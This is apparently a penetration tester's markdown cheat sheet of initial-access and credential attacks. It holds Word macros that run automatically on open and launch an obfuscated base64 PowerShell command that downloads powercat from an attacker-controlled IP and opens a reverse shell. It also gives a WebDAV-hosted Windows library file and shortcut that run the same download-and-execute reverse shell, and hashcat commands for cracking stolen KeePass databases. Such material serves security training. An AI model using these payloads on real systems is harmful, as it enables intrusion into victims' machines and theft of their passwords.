# Macros
```
view -> macros element -> Macros in: Mymacro.doc -> Create 97-2003 word
```

Example Powershell
```
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro ()
' Comment Line
' github.com/steveirwincyber
	CreateObject("Wscript.shell").Run "powershell"



End Sub
```
Powercat
###  base64 this 
IEX(New-Object System.Net-WebClient).DownloadString('http://192.168.45.212/powercat.ps1');powercat -c 192.168.45.212 -p 8080 -e powershell UTF-16LE
python -m http.server /powercat/
nc -nlvp 8080
```
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro ()
' Comment Line
' github.com/steveirwincyber
	Dim Str As String

		Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUA"
		Str = Str + "dwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA"
		Str = Str + "AtAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBh"
		Str = Str + "AGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5AD"
		Str = Str + "IALgAxADYAOAAuADQANQAuADIAMQAyAC8AcABvAHcAZQByAGMA"
		Str = Str + "YQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQ"
		Str = Str + "BjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACAALQBw"
		Str = Str + "ACAAOAAwADgAMAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAG"
		Str = Str + "wA"
	CreateObject("Wscript.Shell").Run Str

End Sub
```



# Windows Library
On Kali
```
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
```
In WIndows Visual Studio
```
# file -> new text file config.library-ms

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.212</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription> 

```

shortcut
automatic_configuration.lnk
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.212:8000/powercat.ps1');
powercat -c 192.168.45.212 -p 4444 -e powershell"
```


# Keepass
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john Database.kdbx > keepass.hash

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# Password Manager